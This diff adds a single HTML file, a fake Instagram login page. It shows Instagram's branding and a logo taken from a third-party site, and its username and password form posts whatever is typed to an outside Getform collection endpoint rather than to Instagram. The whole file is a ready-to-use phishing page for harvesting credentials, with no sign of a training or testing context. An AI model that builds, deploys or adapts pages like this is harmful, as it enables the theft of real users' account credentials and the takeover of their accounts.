@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-box {
+            width: 300px;
+            padding: 40px;
+            background: white;
+            text-align: center;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .login-box img {
+            width: 100px;
+        }
+
+        input[type="text"], input[type="password"] {
+            margin-top: 10px;
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 3px;
+            box-sizing: border-box;
+        }
+
+        input[type="submit"] {
+            margin-top: 20px;
+            width: 100%;
+            padding: 10px;
+            background: #3897f0;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+
+        input[type="submit"]:hover {
+            background: #287dc2;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-box">
+        <img src="https://www.internetmatters.org/wp-content/uploads/2024/08/insta-logo-whie-background.png" alt="Instagram Logo">
+        
+        <!-- Form pointing to Getform endpoint -->
+        <form action="https://getform.io/f/aolgdxdb" method="POST">
+            <label for="username">Username</label>
+            <input type="text" id="username" name="username" required>
+
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" required>
+            <br><br>
+            <input type="submit" value="Submit">
+        </form>
+    </div>
+
+
+</body>
+</html>
